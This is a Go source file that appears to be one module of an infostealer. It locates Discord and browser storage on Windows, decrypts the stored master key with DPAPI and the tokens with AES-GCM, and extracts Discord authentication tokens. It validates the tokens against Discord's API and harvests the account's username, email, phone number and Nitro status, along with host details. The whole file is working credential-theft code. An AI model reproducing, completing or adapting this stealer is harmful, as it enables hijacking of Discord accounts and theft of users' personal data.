package modules

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/user"
	"regexp"
	"runtime"
	"strings"

	"unsafe"

	"golang.org/x/sys/windows"

	utils "ssc/structs"
)

const (
	WebhookUsername = "test"
	DiscordApiUsers = "https://discord.com/api/v9/users/@me"
	DiscordApiNitro = "https://discord.com/api/v9/users/@me/billing/subscriptions"
	DiscordImgUrl   = "https://cdn.discordapp.com/avatars/"
	IpAddrGet       = "https://ipinfo.io/ip"
	Debug           = false
)

type JsonKeyFile struct {
	Crypt OSCrypt `json:"os_crypt"`
}

type OSCrypt struct {
	EncryptedKey string `json:"encrypted_key"`
}

func bytesToBlob(bytes []byte) *windows.DataBlob {
	blob := &windows.DataBlob{Size: uint32(len(bytes))}
	if len(bytes) > 0 {
		blob.Data = &bytes[0]
	}
	return blob
}

func Decrypt(data []byte) ([]byte, error) {

	out := windows.DataBlob{}
	var outName *uint16

	err := windows.CryptUnprotectData(bytesToBlob(data), &outName, nil, 0, nil, 0, &out)
	if err != nil {
		return nil, fmt.Errorf("unable to decrypt DPAPI protected data: %w", err)
	}
	ret := make([]byte, out.Size)
	copy(ret, unsafe.Slice(out.Data, out.Size))

	windows.LocalFree(windows.Handle(unsafe.Pointer(out.Data)))
	windows.LocalFree(windows.Handle(unsafe.Pointer(outName)))

	return ret, nil
}

func doesItemExists(arr []string, item string) bool {

	for i := 0; i < len(arr); i++ {
		if arr[i] == item {
			return true
		}
	}

	return false
}

func getRequest(url string, isChecking bool, token string) (body string, err error) {
	// Setup the Request
	req, err := http.NewRequest("GET", url, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74")
	req.Header.Set("Content-Type", "application/json")
	// We are checking if the token is working
	if isChecking {
		req.Header.Set("Authorization", token)
	}

	if err != nil {
		return
	}

	client := &http.Client{}
	response, err := client.Do(req)

	if err != nil {
		return
	}

	if response.StatusCode != 200 {
		err = fmt.Errorf("GET %s Responded with status code: %d", url, response.StatusCode)
		return
	}

	defer response.Body.Close()

	b, err := io.ReadAll(response.Body)
	if err != nil {
		return
	}

	body = string(b)
	return
}

func isTokenValid(token string, tokenList []string) bool {

	if Debug {
		fmt.Printf("Checking if token is valid %s \n", token)
	}

	// Check if the token is a valid discord token !
	_, err := getRequest(DiscordApiUsers, true, token)
	if err != nil {
		if Debug {
			fmt.Printf("Invalid Token: %s\n", err.Error())
		}
		return false
	}

	// Check if the token is already stored in our token list
	if doesItemExists(tokenList, token) {
		if Debug {
			fmt.Printf("Token already exist !\n")
		}
		return false
	}

	if Debug {
		fmt.Printf("Valid Token !\n")
	}

	return true
}

func getMasterKey() ([]byte, error) {

	jsonFile := os.Getenv("APPDATA") + "/discord/Local State"

	byteValue, err := os.ReadFile(jsonFile)
	if err != nil {
		return nil, fmt.Errorf("could not read json file")
	}

	var fileData JsonKeyFile
	err = json.Unmarshal(byteValue, &fileData)
	if err != nil {
		return nil, fmt.Errorf("could not parse json")
	}

	baseEncryptedKey := fileData.Crypt.EncryptedKey
	encryptedKey, e := base64.StdEncoding.DecodeString(baseEncryptedKey)
	if e != nil {
		return nil, fmt.Errorf("could not decode base64")
	}
	encryptedKey = encryptedKey[5:]

	key, err := Decrypt(encryptedKey)
	if err != nil {
		return nil, fmt.Errorf("cryptunprotectdata decryption Failed ")
	}

	return key, nil
}

func decryptToken(buffer []byte) (string, error) {

	if Debug {
		fmt.Println("Decrypting Token")
	}

	iv := buffer[3:15]
	payload := buffer[15:]

	key, err := getMasterKey()
	if err != nil {
		return "", err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	ivSize := len(iv)
	if len(payload) < ivSize {
		return "", fmt.Errorf("incorrect iv, iv is too big")
	}

	plaintext, err := aesGCM.Open(nil, iv, payload, nil)
	if err != nil {
		return "", err
	}

	return string(plaintext), nil
}

func searchEncryptedToken(line []byte, tokenList *[]string) {

	var tokenRegex = regexp.MustCompile("dQw4w9WgXcQ:[^\"]*")

	for _, match := range tokenRegex.FindAll(line, -1) {

		baseToken := strings.SplitAfterN(string(match), "dQw4w9WgXcQ:", 2)[1]
		encryptedToken, _ := base64.StdEncoding.DecodeString(baseToken)
		token, _ := decryptToken(encryptedToken)

		if isTokenValid(token, *tokenList) {
			*tokenList = append(*tokenList, token)
		}
	}
}

func searchDecryptedToken(line []byte, tokenList *[]string) {

	var tokenRegex = regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}`)

	for _, match := range tokenRegex.FindAll(line, -1) {

		token := string(match)

		if isTokenValid(token, *tokenList) {
			*tokenList = append(*tokenList, token)
		}
	}
}

func getJsonValue(key string, jsonData string) (value string) {

	// We will query only string from the json !!
	var result map[string]interface{}

	err := json.Unmarshal([]byte(jsonData), &result)
	if err != nil {
		return "Unknown"
	}

	value = fmt.Sprintf("%v", result[key])
	return
}

func GrabTokenInformation(token string) utils.TokenUserData {

	// Get User displayName
	var displayName string
	currentUser, err := user.Current()
	if err != nil {
		displayName = "Unknown"
	} else {
		displayName = currentUser.Name
	}

	// Get OS Type & Proc arch
	osName := runtime.GOOS
	cpuArch := runtime.GOARCH

	var tokenInformation string
	body, err := getRequest(DiscordApiUsers, true, token)
	if err != nil {
		tokenInformation = "Unknown"
	} else {
		tokenInformation = body
	}

	discordUser := getJsonValue("username", tokenInformation) + "#" + getJsonValue("discriminator", tokenInformation)
	discordEmail := getJsonValue("email", tokenInformation)
	discordPhone := getJsonValue("phone", tokenInformation)

	var discordNitro string
	body, err = getRequest(DiscordApiNitro, true, token)
	if err != nil {
		discordNitro = "Unknown"
	} else {

		if body == "[]" {
			discordNitro = "No"
		} else {
			discordNitro = "Yes"
		}
	}

	tokenUserData := utils.TokenUserData{
		DisplayName:  displayName,
		OsName:       osName,
		CpuArch:      cpuArch,
		DiscordUser:  discordUser,
		DiscordEmail: discordEmail,
		DiscordPhone: discordPhone,
		DiscordNitro: discordNitro,
	}

	return tokenUserData
}

func getAllTokens() string {

	var paths map[string]string
	var tokenList []string

	local := os.Getenv("LOCALAPPDATA")
	roaming := os.Getenv("APPDATA")

	paths = map[string]string{
		"Lightcord":      roaming + "/Lightcord",
		"Discord":        roaming + "/Discord",
		"Discord Canary": roaming + "/discordcanary",
		"Discord PTB":    roaming + "/discordptb",
		"Google Chrome":  local + "/Google/Chrome/User Data/Default",
		"Opera":          roaming + "/Opera Software/Opera Stable",
		"Opera GX":       roaming + "/Opera Software/Opera GX Stable",
		"Brave":          local + "/BraveSoftware/Brave-Browser/User Data/Default",
		"Yandex":         local + "/Yandex/YandexBrowser/User Data/Default",
	}

	for pathName, path := range paths {

		if _, err := os.Stat(path); os.IsNotExist(err) {
			continue
		}

		path += "/Local Storage/leveldb/"
		files, _ := os.ReadDir(path)

		for _, file := range files {
			name := file.Name()

			if !strings.HasSuffix(name, ".log") && !strings.HasSuffix(name, ".ldb") {
				continue
			}

			content, _ := os.ReadFile(path + "/" + name)
			lines := bytes.Split(content, []byte("\\n"))

			for _, line := range lines {

				if strings.Contains(pathName, "Discord") {
					searchEncryptedToken(line, &tokenList)
				} else {
					searchDecryptedToken(line, &tokenList)
				}

			}
		}
	}

	for _, token := range tokenList {
		return token
	}

	return "N/A"
}

func GetDiscordUserData() string {
	res := getAllTokens()
	return res
}
